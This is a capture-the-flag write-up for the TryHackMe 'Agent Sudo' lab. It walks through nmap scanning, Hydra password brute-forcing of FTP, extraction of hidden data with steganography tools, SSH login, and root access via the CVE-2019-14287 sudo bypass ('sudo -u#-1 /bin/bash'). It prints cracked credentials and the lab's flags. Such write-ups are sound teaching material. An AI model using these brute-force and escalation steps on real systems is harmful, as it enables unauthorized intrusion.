TryHackMe — Agent Sudo

Platform: TryHackMe
Difficulty: Easy
Category: Linux / FTP / Web / Steganography / Privilege Escalation
Target: 10.48.187.59

1. Initial Reconnaissance

I started with an Nmap scan to identify the services running on the target.
nmap -sC -sV -Pn -T4 10.48.187.59
The scan revealed three open ports:
21/tcp  open  ftp     vsftpd 3.0.3
22/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu
80/tcp  open  http    Apache 2.4.29
Since FTP was available, I decided to investigate it first.

2. FTP Enumeration

I tried to connect to the FTP server using anonymous login:
ftp 10.48.187.59
I entered:
Username: anonymous
The server asked for a password, but the login failed with:
530 Login incorrect
So anonymous FTP access was not available.
I then moved on to the web server.

3. Web Enumeration

I first tried directory enumeration with Gobuster:
gobuster dir -u http://10.48.187.59 -w /usr/share/wordlists/dirb/common.txt
The scan did not reveal anything particularly useful.
I then opened the target IP address in Firefox:
http://10.48.187.59
The webpage displayed a message about agents and gave a clue that the secret agent's name starts with the letter C.
The page also indicated that the agent's codename needed to be used as the HTTP User-Agent.
I searched for a way to change the User-Agent in Firefox and found the User-Agent Switcher/Manager extension.
I installed the extension, changed the User-Agent to:
C
and refreshed the page.
The website then revealed the agent's name:
Chris
This gave me a possible FTP username:
chris


4. FTP Password Discovery

Since I now had the username `chris`, I used Hydra to test passwords against the FTP service.
hydra -l chris -P /usr/share/wordlists/rockyou.txt 10.48.187.59 ftp
Hydra successfully found the password:
Username: chris
Password: crystal
I then tried logging into FTP again:
ftp 10.48.187.59
This time the login was successful.
I listed the available files:
ls
The FTP server contained:
To_agentJ.txt
cute-alien.jpg
cutie.png
I downloaded all the files using:
mget *


5. Investigating the Downloaded Files

There were three files:
cute-alien.jpg
cutie.png
To_agentJ.txt
I first read the text file:
cat To_agentJ.txt
It contained:
Dear agent J,
All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.
From,
Agent C
This indicated that the images contained additional information and that the login password was hidden inside one of them.

6. Image Enumeration

I checked the metadata of both images using ExifTool:
exiftool cute-alien.jpg
and:
exiftool cutie.png
The JPEG metadata did not reveal the password.
The PNG, however, contained a suspicious warning:
Warning: [minor] Trailer data after PNG IEND chunk
This suggested that there was additional data appended to the PNG file.
I then used Binwalk against both images:
binwalk cute-alien.jpg
and:
binwalk cutie.png
The JPEG did not contain anything interesting, but the PNG contained an embedded ZIP archive.
The Binwalk output showed:
Zip archive data, encrypted
name: To_agentR.txt
I extracted the embedded files using:
binwalk -e cutie.png
This created an extracted directory containing the embedded ZIP and other data.

7. Investigating the Embedded ZIP

Inside the extracted directory, I found:
8702.zip
To_agentR.txt
I read the extracted text file:
cat To_agentR.txt
It contained:
Agent C,
We need to send the picture to 'QXJlYTUx' as soon as possible!
By,
Agent R
The value:
QXJlYTUx
looked like Base64-encoded text.
I decoded it using a Base64 decoder, which revealed:
Area51
I then investigated the password-protected ZIP archive.
I generated a hash from the ZIP using:
zip2john 8702.zip > hash.txt
Then I used John the Ripper to crack the hash:
john hash.txt
After cracking the hash, I checked the recovered password:
john --show hash.txt
The ZIP password was recovered successfully.
I was then able to access the contents of the archive.

8. Steganography in cute-alien.jpg

The earlier message said that the login password was stored inside the fake picture, so I investigated `cute-alien.jpg` using Steghide.
steghide extract -sf cute-alien.jpg
Steghide extracted:
message.txt
I read the file:
cat message.txt
The message revealed the SSH login password for James:
Hi james,
Glad you find this message. Your login password is hackerrules!
Don't ask me why the password look cheesy, ask agent R who set this password for you.
Your buddy,
chris
So I now had:
Username: james
Password: hackerrules!


9. SSH Login

I used the credentials to connect through SSH:
ssh james@10.48.187.59
The login was successful.
I verified the current user:
whoami
Output:
james
I checked the home directory:
ls
The user flag was present in:
user_flag.txt
I retrieved it using:
cat user_flag.txt
User flag:
b03d975e8c92a7c04146cfa7a5a313c7


10. Privilege Escalation

After obtaining the user shell, I checked the sudo permissions:
sudo -l
The result was:
User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
This looked interesting because James was allowed to execute `/bin/bash` as other users, with root apparently excluded.
I then checked the installed sudo version:
sudo --version
The target was running:
Sudo version 1.8.21p2
This version is vulnerable to CVE-2019-14287, which can allow the `(ALL, !root)` restriction to be bypassed through special UID handling.
I used the corresponding exploit payload:
sudo -u#-1 /bin/bash
I then checked the current user:
whoami
The result was:
root
This confirmed that privilege escalation was successful.

11. Root Flag

I moved to the root directory:
cd /root
Then listed the files:
ls
The root flag was stored in:
root.txt
I read it using:
cat root.txt
Root flag:
b53a02f55b57d4439e3341834d70c062
The machine was successfully rooted.

